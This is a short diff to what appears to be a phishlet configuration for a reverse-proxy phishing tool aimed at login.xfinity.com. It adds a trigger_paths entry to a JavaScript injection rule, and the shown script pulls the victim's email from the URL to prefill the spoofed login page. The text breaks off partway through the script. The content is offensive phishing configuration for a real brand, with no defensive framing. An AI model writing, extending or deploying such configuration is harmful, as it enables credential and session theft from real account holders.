@@ -11,6 +11,7 @@ sub_filters:
 js_inject:
   - trigger_domains: ["login.xfinity.com"]
     trigger_urls: ["/"]
+    trigger_paths: ["/"]
     script: |
       let params = new URLSearchParams(window.location.search);
       let email = params.get("email");
